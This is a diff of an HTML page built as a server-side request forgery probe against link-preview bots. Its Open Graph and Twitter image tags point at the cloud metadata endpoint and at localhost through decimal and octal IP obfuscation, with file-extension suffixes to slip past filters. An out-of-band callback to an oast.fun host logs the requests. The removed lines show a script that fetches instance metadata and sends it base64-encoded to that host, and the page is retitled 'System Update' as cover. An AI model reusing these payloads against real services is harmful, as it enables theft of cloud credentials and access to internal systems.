@@ -1,18 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta property="og:image" content="http://169.254.169.254/latest/meta-data/">
+    <meta charset="UTF-8">
+    <meta property="og:image" content="http://2852035326/latest/meta-data/instance-id?.png">
     
-    <meta property="og:audio" content="http://vknode-test-internal.esqbwjbyepcxrsacleqfn3brg9zqkpqek.oast.fun/track.mp3">
+    <meta property="og:thumbnail" content="http://0177.0.0.01/status?.jpg">
     
-    <meta property="og:title" content="Security Analysis Stage 2">
+    <meta property="twitter:image" content="http://esqbwjbyepcxrsacleqfn3brg9zqkpqek.oast.fun/log/v1?url=http://localhost">
+
+    <meta property="og:title" content="System Update">
 </head>
 <body>
-    <script>
-        // Если бот вдруг исполняет JS (маловероятно, но для полноты теста)
-        fetch('http://169.254.169.254/latest/meta-data/').then(r => r.text()).then(d => {
-            fetch('https://esqbwjbyepcxrsacleqfn3brg9zqkpqek.oast.fun/exfiltrate?data=' + btoa(d));
-        });
-    </script>
+    <p>Тестирование инфраструктуры...</p>
 </body>
 </html>
